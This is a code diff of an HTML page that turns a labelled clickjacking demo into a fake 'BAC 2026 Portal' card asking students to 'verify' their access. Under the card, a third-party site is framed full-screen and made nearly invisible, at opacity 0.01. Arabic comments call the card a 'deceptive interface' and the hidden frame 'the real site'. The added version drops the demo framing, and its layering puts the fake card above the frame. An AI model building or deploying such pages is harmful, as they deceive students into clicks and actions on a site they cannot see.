@@ -1,32 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Clickjacking Demo</title>
+  <meta charset="UTF-8" />
+  <title>Secure Student Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
   <style>
-    iframe {
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+
+    .card {
+      width: 360px;
+      background: #111;
+      border-radius: 14px;
+      padding: 24px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .card h1 {
+      margin: 0 0 10px;
+      font-size: 22px;
+    }
+
+    .card p {
+      font-size: 14px;
+      opacity: 0.8;
+      margin-bottom: 20px;
+    }
+
+    .btn {
       width: 100%;
-      height: 100vh;
-      opacity: 0.2; /* نخفي الموقع */
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #00d4ff;
+      color: #000;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #00b8dd;
+    }
+
+    /* iframe (الموقع الحقيقي) */
+    iframe {
       position: absolute;
       top: 0;
       left: 0;
-      z-index: 2;
-    }
-    button {
-      position: absolute;
-      top: 40%;
-      left: 40%;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      opacity: 0.01; /* شبه مخفي */
       z-index: 1;
-      font-size: 30px;
-      padding: 20px;
     }
   </style>
 </head>
 <body>
 
-<button>اضغط هنا واربح 🎁</button>
+  <!-- الموقع الحقيقي داخل iframe -->
+  <iframe src="https://fierce-gibbon.super.site"></iframe>
 
-<iframe src="https://fierce-gibbon.super.site/"></iframe>
+  <!-- واجهة خادعة -->
+  <div class="card">
+    <h1>BAC 2026 Portal</h1>
+    <p>Verify your student access to continue</p>
+    <button class="btn">Continue</button>
+  </div>
 
 </body>
 </html>
+
+
